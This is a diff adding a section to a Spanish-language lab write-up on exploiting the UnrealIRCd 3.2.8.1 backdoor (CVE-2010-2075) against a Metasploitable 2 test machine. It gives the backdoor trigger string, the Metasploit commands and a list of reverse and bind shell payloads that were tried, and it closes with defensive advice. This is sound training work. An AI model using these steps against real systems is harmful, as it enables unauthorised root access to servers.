@@ -152,3 +152,56 @@ Por eso el LHOST es imprescindible.
 - Firewall para limitar el acceso a servicios SMB
 
 ---
+
+## 2.4 · UnrealIRCd 3.2.8.1 Backdoor — Metasploit
+
+**Herramienta:** Metasploit Framework
+
+**CVE:** CVE-2010-2075
+
+**¿Qué es esta vulnerabilidad?**
+En 2010 se descubrió que el código fuente oficial de UnrealIRCd 3.2.8.1
+había sido comprometido con una backdoor. Cuando se envía la cadena
+"AB;" al servidor IRC, ejecuta el comando que viene a continuación
+directamente como root. Es el mismo patrón que vsftpd — software
+oficial saboteado en el repositorio de descarga.
+
+**Comandos utilizados:**
+```bash
+search unreal ircd
+use 0
+set RHOSTS 192.168.85.129
+set LHOST 192.168.85.128
+run
+```
+
+**Resultado:**
+El exploit detectó correctamente la vulnerabilidad y envió el comando
+de backdoor, pero no fue posible crear una sesión estable.
+
+Se probaron los siguientes payloads sin éxito:
+- cmd/unix/reverse_netcat
+- cmd/unix/reverse
+- cmd/unix/reverse_bash
+- cmd/unix/bind_netcat
+- cmd/unix/reverse_perl
+
+Al no conseguir sesión con el payload por defecto, consulté con Claude AI
+para entender el problema y probar alternativas. La conclusión fue que
+el netcat instalado en Metasploitable 2 (Ubuntu 8.04) es demasiado antiguo
+y no soporta la opción `-e` necesaria para los payloads reverse shell.
+El exploit en sí funciona correctamente — el problema es la incompatibilidad
+del payload con el sistema víctima.
+
+**¿Qué confirma esto?**
+- La vulnerabilidad existe y fue detectada ✅
+- El exploit la activa correctamente ✅
+- Sesión no establecida por incompatibilidad de payload ❌
+
+**Reflexión Blue Team — ¿Cómo se evita?**
+- Verificar siempre la integridad del software descargado (hash SHA256)
+- No usar versiones de IRC de 2010 en producción
+- Cerrar el puerto 6667 si no se usa IRC
+- Monitorizar conexiones salientes inusuales desde servidores
+
+---
